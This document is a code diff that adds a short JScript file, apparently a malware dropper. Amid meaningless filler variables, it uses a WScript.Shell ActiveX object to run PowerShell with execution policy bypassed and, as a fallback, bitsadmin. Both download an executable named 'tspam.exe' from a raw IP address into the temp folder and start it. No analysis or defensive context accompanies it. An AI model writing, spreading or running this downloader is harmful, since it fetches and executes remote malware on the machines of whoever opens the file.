@@ -1,0 +1,15 @@
+var ouggh = 59593;
+var ihghg = 39590;
+var oghohsiog = 3950;
+var jsRun=new ActiveXObject('WSCRIPT.Shell');
+var oghhe = 3990;
+var oeighirh = 395905;
+jsRun.Run("cmd.exe /c PowerShell -ExecutionPolicy Bypass (New-Object System.Net.WebClient).DownloadFile('http://217.8.117.63/tspam.exe','%temp%\\394955.exe');Start-Process '%temp%\\394955.exe'",false);
+var gohrg = 3995;
+var eigh = 39944;
+var irghrh = 39595;
+jsRun.Run("cmd.exe /c bitsadmin /transfer twetaeihwuwe /download /priority high http://217.8.117.63/tspam.exe %temp%\\558392.exe&start %temp%\\558392.exe", false);
+var bebibebe = 395905;
+var erihg = 39495;
+var orgh = 3959;
+var osrghrohg = 3959;
